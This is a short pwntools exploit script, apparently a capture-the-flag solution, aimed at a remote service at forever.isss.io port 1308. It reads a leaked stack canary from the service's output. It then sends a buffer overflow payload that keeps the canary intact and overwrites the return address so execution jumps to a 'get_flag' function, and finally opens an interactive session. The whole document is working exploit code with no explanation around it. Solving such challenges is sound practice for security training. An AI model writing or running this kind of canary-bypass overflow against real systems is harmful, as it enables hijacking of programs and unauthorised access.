from pwn import *

host = "forever.isss.io"
port = 1308

p = remote(host, port)

get_flag = p64(0x40133b)


p.recvline()
p.recv()
p.sendline(b"128")
p.recvline()
p.sendline(b"JINX")
p.recvline()
canary = p.recvline()
canary = u64(canary[104:112])
p.sendline(b"A" * 104 + p64(canary) + b"A" * 8 + get_flag)
p.interactive()
